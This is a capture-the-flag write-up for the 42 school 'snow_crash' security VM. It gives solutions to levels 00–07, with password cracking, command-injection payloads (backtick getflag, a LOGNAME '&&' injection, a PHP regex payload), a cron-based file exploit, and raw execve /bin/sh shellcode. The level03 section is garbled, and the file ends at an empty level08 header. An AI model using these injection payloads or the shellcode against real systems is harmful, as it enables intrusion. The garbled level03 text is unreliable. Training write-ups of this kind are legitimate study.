# snow_crash
Security project of 42school


Link to the VM: https://projects.intra.42.fr/uploads/document/document/5137/SnowCrash.iso.


## Level00

Find interesting files: `find / -user flag00`.
File conraining `cdiiddwpgswtgt` founded.
Supposed to be a `Caesar Cipher`. Use [Dcode](https://www.dcode.fr/caesar-cipher).
Password is: `nottoohardhere`.
Flag is: `x24ti5gi3x0ol2eh4esiuxias`

## level01
Find interesting files: `find / -user flag01`.
Nothing founded, let's check in `/etc/passwd`.
Found:
`flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash`.
Put this onto a user.txt file and give it to `John`.
John output:
`flag01:abcdefg:3001:3001::/home/flag/flag01:/bin/bash`.    

Password is: `abcdefg`.
Flag is: `f2av5il02puano7naaf6adaaf`.

## level02

There is a `level02.pcap` file. a `.pcap` file can be opened with `wireshark` and represent a capture of some network transmissions.     
First we need to extract this file using `scp`.
`scp -q -P 2222 level02@10.64.1.226:./level02.pcap ./level02/`

Then I open the file with Wireshark, select the first packet and `Follow the TCP stream`.
Now I can see the password in plain text: `Password: ft_wandr...NDRel.L0L`.
Then I need to interpret the DEL characters and get the remaining password.

Password is: `ft_waNDReL0L`.
Flag is: `kooda2puivaav1idi4f57q8iq`.

## level03

First I download the file to inspect it localy with:
`scp -q -P 2222 level03@10.1.6.4:./level03 ./level03/`
\003\205\004\b\340\205\004\b\323\a"

\x48\xc7\xc0\x3b\x00\x00\x00\x48\xc7\xc2\x00\x00\x00\x00\x49\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x48\xc7\xc0\x3c\x00\x00\x00\x48\xc7\xc7\x00\x00\x00\x00\x0f\x05\\


0xbffff8fb
/tmp/O:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
scp -P 2222 echo.c level03@10.64.1.240:/tmp/O/
Flag is: `qi0maab88jeaj46qoumi7maus`.

## level04

There is a `level04.pl` file.
run: curl -v http://localhost:4747/?x=\`getflag\`

Flag is: `ne2searoevaevoem4ov4ar8ap`.

## level05

A message inform you that you have a new mail.
Display it with:    
`cat /var/mail/level05`
It informs you about a current cronjob:    
`*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05`.

Find other interesting files: `find / -user flag05`.    
Bash script founded: `/usr/sbin/openarenaserver`.    

Exploit it with:
```
    mkdir /tmp/file
    touch /tmp/file/flag
    chmod 777 /tmp/file/flag
    echo "getflag > /tmp/file/flag" > /opt/openarenaserver/file
```
Then wait for the cron to run.
You can now display the flag with `cat /tmp/file/flag`.

Flag is: `viuaaale9huek52boumoomioc`.

## level06

There is two files:
- level06.php (a php code)
- level06 (the compiled SUID version of the above)

1 - open a file and read its content.
2 - Decode the regex and execute command.

Payload: "[x ${`getflag`}]"
Flag is: `wiok45aaoguiboiki2tuin6ub`.

## level07

There is a file called `level07`.    

syscall founded:
- system
- asprintf
- getenv

strings founded:
- `/bin/echo %s`
- `LOGNAME`

1- the program use `system`.
2- the programme give it the string: `/bin/echo %s`.
3- the program get the env variable `LOGNAME` and give it to asprintf.

Payload: export LOGNAME="level07 && getflag"
Flag is: `fiumuikeil55xe9cu4dood66h`.

## level08
